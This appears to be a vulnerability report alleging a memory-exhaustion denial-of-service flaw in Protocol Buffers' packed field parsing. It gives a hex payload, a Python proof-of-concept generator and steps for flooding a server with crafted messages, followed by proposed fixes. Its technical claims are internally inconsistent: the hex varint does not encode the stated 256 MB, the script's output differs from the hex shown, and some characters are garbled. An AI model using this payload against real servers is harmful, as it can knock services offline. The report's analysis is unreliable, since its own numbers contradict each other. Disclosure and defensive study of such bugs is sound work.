================================================================================
VULNERABILITY REPORT: Memory Exhaustion DoS in Google Protocol Buffers
================================================================================

SEVERITY: HIGH
TYPE: Denial of Service (DoS) via Memory Exhaustion
AFFECTED COMPONENT: Packed Repeated Field Parser
CVSS SCORE: 7.5 (High)

================================================================================
SUMMARY
================================================================================

A critical memory exhaustion vulnerability exists in Google Protocol Buffers'
packed repeated field parsing implementation. An attacker can craft malicious
protobuf messages that cause the parser to pre-allocate massive amounts of
memory based on a declared field size, even when minimal actual data is
provided. This leads to memory exhaustion and denial of service.

================================================================================
VULNERABILITY LOCATION
================================================================================

File: protobuf/src/google/protobuf/parse_context.h
Function: ReadPackedVarintArrayWithField()
Lines: 1385-1424

Specifically, the vulnerable code is at lines 1395-1405:

    if ((end - ptr) >= 16 && (out.Capacity() - out.size() < end - ptr)) {
        int old_size = out.size();
        int count = out.Capacity() - out.size();
        if (count < end - ptr) {
            count = std::count_if(ptr, end, [](char c) { return (c & 0x80) == 0; });
            if (end[-1] & 0x80) count++;
            out.ReserveWithArena(arena, old_size + count);  // VULNERABLE
        }
    }

Additional vulnerable entry point:
File: protobuf/src/google/protobuf/parse_context.h
Function: ReadPackedVarintWithField()
Line: 1429 - where size is read from attacker-controlled input

================================================================================
ROOT CAUSE
================================================================================

The vulnerability occurs due to premature memory reservation before data
validation:

1. The parser reads a size field from the wire format (attacker-controlled)
2. It calculates 'end = ptr + size' using this untrusted size value
3. It counts expected elements by scanning bytes between ptr and end
4. It pre-allocates memory via ReserveWithArena() for all counted elements
5. ONLY THEN does it attempt to parse the actual data

The critical flaw: Memory allocation happens BEFORE verifying that the
declared amount of data actually exists in the input buffer.

  Attacker declares size = 500 MB
  â†’ Parser calculates end = ptr + 500MB
  â†’ Parser counts ~100M elements (by scanning continuation bits)
  â†’ Parser allocates memory for 100M integers (~400MB-800MB)
  â†’ Parser tries to read data â†’ FAILS (only 10 bytes available)
  â†’ Memory already allocated â†’ DoS achieved

================================================================================
AFFECTED FIELD TYPES
================================================================================

All packed repeated numeric and enum fields:
- repeated int32 (packed=true)
- repeated int64 (packed=true)
- repeated uint32 (packed=true)
- repeated uint64 (packed=true)
- repeated sint32 (packed=true)
- repeated sint64 (packed=true)
- repeated bool (packed=true)
- repeated enum (packed=true)

================================================================================
WHY EXISTING PROTECTIONS FAIL
================================================================================

1. ReadSize() protection (parse_context.cc:560):
   - Only rejects sizes >= 2GB
   - Allows sizes up to ~2GB which is still exploitable

2. kSafeStringSize protection:
   - Only applies to string fields
   - Does NOT protect repeated numeric fields

3. TotalBytesLimit:
   - Enforced during parsing, not before allocation
   - Memory spike occurs before limit check

4. Recursion depth limits:
   - Irrelevant to this vulnerability

================================================================================
HOW TO REPRODUCE
================================================================================

STEP 1: Create a test .proto file
---------------------------------
syntax = "proto3";

message VulnerableMessage {
  repeated int32 packed_values = 1 [packed=true];
}


STEP 2: Craft malicious binary message
---------------------------------------
The malicious message structure:
  - Tag: 0x0A (field 1, wire type 2 = length-delimited)
  - Length: 0x80 0x80 0x80 0x10 (268,435,456 bytes = 256 MB as varint)
  - Data: 0x01 0x02 0x03 0x04 0x05 (only 5 bytes of actual data)

Hex payload:
  0A 80 80 80 10 01 02 03 04 05


STEP 3: Send to parser
----------------------
Parse the crafted message using protobuf parser. The parser will:
  1. Read length = 256 MB
  2. Calculate ~50-200 million expected int32 values
  3. Allocate memory for ~200-800 MB of integers
  4. Fail parsing (insufficient data)
  5. Leave allocated memory in place


STEP 4: Observe memory exhaustion
----------------------------------
Send 5-10 such messages in rapid succession to exhaust server memory.

Expected result: Server process consumes multiple gigabytes of RAM and
either crashes (OOM) or becomes unresponsive (DoS).

================================================================================
PROOF OF CONCEPT CODE
================================================================================

Python script to generate malicious message:

    import struct
    
    # Craft malicious protobuf message
    field_tag = 0x0A              # Field 1, wire type 2
    declared_size = 256 * 1024 * 1024  # 256 MB
    
    # Encode size as varint
    size_bytes = []
    val = declared_size
    while val > 127:
        size_bytes.append((val & 0x7F) | 0x80)
        val >>= 7
    size_bytes.append(val)
    
    # Malicious payload: large size, minimal data
    payload = bytes([field_tag]) + bytes(size_bytes) + b'\x01\x02\x03\x04\x05'
    
    # Send to server or save to file
    with open('malicious.bin', 'wb') as f:
        f.write(payload)

================================================================================
RECOMMENDED FIXES
================================================================================

1. IMMEDIATE FIX: Implement strict pre-allocation limits
   - Cap reservation based on actual available buffer size
   - Reserve min(calculated_count, available_bytes / min_element_size)

2. DEFERRED ALLOCATION: Reserve memory lazily
   - Parse elements first, then allocate exact amount needed
   - Trade CPU for safety

3. VALIDATION: Add size sanity checks
   - Reject lengths > available buffer size early
   - Add configurable max allocation limits per field

4. REGRESSION TESTS: Add test cases
   - Packed fields with large declared size, minimal data
   - Verify no excessive pre-allocation occurs

Sample fix for ReadPackedVarintArrayWithField():

    // Before counting, verify size is reasonable
    int available = std::min(static_cast<int>(end - ptr), 
                             BytesAvailable(ptr));
    if (end - ptr > available) {
        end = ptr + available;  // Clamp to actual buffer
    }
    
    // Then proceed with existing count logic...

ADDITIONAL NOTES
================================================================================

- This vulnerability has existed in the codebase for multiple versions
- The optimization comment at line 1391-1392 explains the intent but
  reveals the flaw: "count first and preallocate" without validation
- The Truncate() call at line 1417 cleans up excess allocation but
  only AFTER memory spike has occurred
- Similar patterns may exist in fixed-size packed field parsers
